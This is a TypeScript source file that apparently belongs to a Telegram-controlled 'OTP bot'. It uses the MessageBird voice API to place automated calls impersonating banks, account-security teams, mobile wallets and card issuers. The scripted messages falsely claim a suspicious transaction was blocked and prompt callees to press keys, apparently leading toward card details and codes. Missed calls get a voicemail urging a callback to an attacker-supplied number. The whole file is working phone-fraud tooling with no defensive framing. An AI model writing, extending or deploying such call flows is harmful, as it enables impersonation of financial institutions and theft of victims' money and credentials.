/* eslint-disable no-console */
/* eslint-disable @typescript-eslint/no-explicit-any */
import initMB, { CallFlowParameter } from 'messagebird';
import { languages } from 'messagebird/types/voice_messages';
import { v4 as uuidv4 } from 'uuid';
import { bot } from '..';

export const messagebird = initMB(process.env.MESSAGEBIRD_API_KEY as string);

interface CallInputType {
  institutionName: string;
  to: string;
  from: string;
  chatId: number;
  step: string;
  wallet?: string;
  cardType?: string;
  askCardInfo?: string;
  transferNumber: string;
}

const callFlow = (
  institutionName: string,
  language: languages | undefined,
  step: string,
  chatId: number,
  wallet?: string,
  cardType?: string,
  askCardInfo?: string,
  transferNumber?: string,
  from?: string,
): CallFlowParameter => {
  switch (step) {
    case 'bank':
      return {
        id: uuidv4(),
        title: `call bank - ${chatId}`,
        record: false,
        steps: [
          {
            // @ts-expect-error id is indeed known param
            id: uuidv4(),
            action: 'say',
            options: {
              ifMachine: 'delay',
              payload: `This is a call from ${institutionName.toUpperCase()} fraud prevention line. We have BLOCKED a recent SUSPICIOUS transaction on your account. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
              language,
              voice: 'female',
              length: 5,
            },
            onKeypressGoto: 'bankStepGoto',
            onKeypressVar: 'dtmf',
          },
          {
            // @ts-expect-error id is indeed known param
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'bankStepGoto',
            onKeypressVar: 'dtmf',
          },
          {
            action: 'hangup',
          },
          {
            // @ts-expect-error id is indeed known param
            id: 'bankStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}`,
            },
          },
        ],
      };
    case 'account':
      return {
        id: uuidv4(),
        title: `call account - ${chatId}`,
        record: false,
        steps: [
          {
            // @ts-expect-error id is indeed known param
            id: uuidv4(),
            action: 'say',
            options: {
              ifMachine: 'delay',
              payload: `This is a call from ${institutionName.toUpperCase()} account security line. We have BLOCKED a recent SUSPICIOUS login attempt on your account. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
              language,
              voice: 'female',
              length: 5,
            },
            onKeypressGoto: 'accountStepGoto',
            onKeypressVar: 'dtmf',
          },
          {
            // @ts-expect-error id is indeed known param
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'accountStepGoto',
            onKeypressVar: 'dtmf',
          },
          {
            action: 'hangup',
          },
          {
            // @ts-expect-error id is indeed known param
            id: 'accountStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?askCardInfo=${askCardInfo}`,
            },
          },
        ],
      };
    case 'pay':
      return {
        id: uuidv4(),
        title: `call pay - ${chatId}`,
        record: false,
        steps: [
          {
            // @ts-expect-error id is indeed known param
            id: uuidv4(),
            action: 'say',
            options: {
              ifMachine: 'delay',
              payload: `This is a call from ${institutionName.toUpperCase()} mobile wallet line. We have BLOCKED a recent SUSPICIOUS ${wallet} purchase. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
              language,
              voice: 'female',
              length: 5,
            },
            onKeypressGoto: 'payStepGoto',
            onKeypressVar: 'dtmf',
          },
          {
            // @ts-expect-error id is indeed known param
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'payStepGoto',
            onKeypressVar: 'dtmf',
          },
          {
            action: 'hangup',
          },
          {
            // @ts-expect-error id is indeed known param
            id: 'payStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${
                process.env.ENDPOINT_URL
              }/calls/dtmf/${language}/${step}/${chatId}?wallet=${wallet
                ?.replace(/\s/g, '')
                .toLowerCase()}`,
            },
          },
        ],
      };
    case 'card':
      return {
        id: uuidv4(),
        title: `call card - ${chatId}`,
        record: false,
        steps: [
          {
            // @ts-expect-error id is indeed known param
            id: uuidv4(),
            action: 'say',
            options: {
              ifMachine: 'delay',
              payload: `This is a call from ${institutionName.toUpperCase()} fraud prevention line. We have BLOCKED a recent SUSPICIOUS online purchase, your ${cardType} card details was used. If this was not you, please press 1, if this was you, please press 2, to repeat these options, please press 3.`,
              language,
              voice: 'female',
              length: 5,
            },
            onKeypressGoto: 'cardStepGoto',
            onKeypressVar: 'dtmf',
          },
          {
            // @ts-expect-error id is indeed known param
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'cardStepGoto',
            onKeypressVar: 'dtmf',
          },
          {
            action: 'hangup',
          },
          {
            // @ts-expect-error id is indeed known param
            id: 'cardStepGoto',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?cardType=${cardType}`,
            },
          },
        ],
      };
    case 'pgp':
      return {
        id: uuidv4(),
        title: `Calling - ${chatId}`,
        record: false,
        steps: [
          {
            id: uuidv4(),
            action: 'say',
            options: {
              ifMachine: 'delay',
              payload: `Welcome to the ${institutionName} fraud prevention line. We recently notice a suspicious activity on your account, if this was you simply hang up. If this was not you please press 1 to speak to a ${institutionName} representative to better assist you in securing your account.`,
              language: 'en-us',
              voice: 'female',
              length: 5,
              // @ts-expect-error ts does not recognise loop
              loop: true,
            },
            onKeypressGoto: 'nextStep',
            onKeypressVar: 'dtmf',
          },
          {
            // @ts-expect-error ts does not recognise id
            id: uuidv4(),
            action: 'pause',
            options: {
              length: 5,
            },
            onKeypressGoto: 'nextStep',
            onKeypressVar: 'dtmf',
          },
          {
            // @ts-expect-error ts does not recognise id
            id: uuidv4(),
            action: 'say',
            options: {
              payload: `We are sorry we missed you, there is a urgent matter in regards to a recent activities on your ${institutionName}  your account. Please Call us back to speak with a bank specialist regarding this matter on ${transferNumber
                ?.split('')
                .join(' ')}`,
              language: 'en-us',
              voice: 'female',
              length: 5,
            },
          },
          {
            action: 'hangup',
          },
          {
            // @ts-expect-error ts does not recognise id
            id: 'nextStep',
            action: 'fetchCallFlow',
            options: {
              url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?transferNumber=${transferNumber}&from=${from}`,
            },
          },
        ],
      };
    default:
      return {
        // @ts-expect-error id is indeed known param
        id: uuidv4(),
        title: 'should never be here',
        steps: [
          {
            action: 'hangup',
          },
        ],
      };
  }
};

export const messagebirdMakeACall: any = async ({
  institutionName,
  to,
  from,
  step,
  wallet,
  cardType,
  askCardInfo,
  chatId,
  transferNumber,
}: CallInputType) => {
  const flow =
    /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(
      to,
    )
      ? callFlow(
          institutionName,
          'en-gb',
          step,
          chatId,
          wallet,
          cardType,
          askCardInfo,
          transferNumber,
          from,
        )
      : callFlow(
          institutionName,
          'en-us',
          step,
          chatId,
          wallet,
          cardType,
          askCardInfo,
          transferNumber,
          from,
        );

  return messagebird.calls.create(
    {
      source: from,
      destination: to,
      callFlow: flow,
      // @ts-expect-error ignore
      webhook: {
        url: `${process.env.ENDPOINT_URL}/calls/${chatId}`,
        token: process.env.MESSAGEBIRD_TOKEN,
      },
    },
    async (err, res) => {
      if (err) {
        console.log(err);

        await bot.telegram.sendMessage(
          chatId,
          `Something went wrong try again later.`,
        );
        await bot.context.scene?.enter('super-wizard');
        return;
      }
      console.log(res);

      await bot.telegram.sendMessage(chatId, `Calling (${to}) 📞`);
    },
  );
};
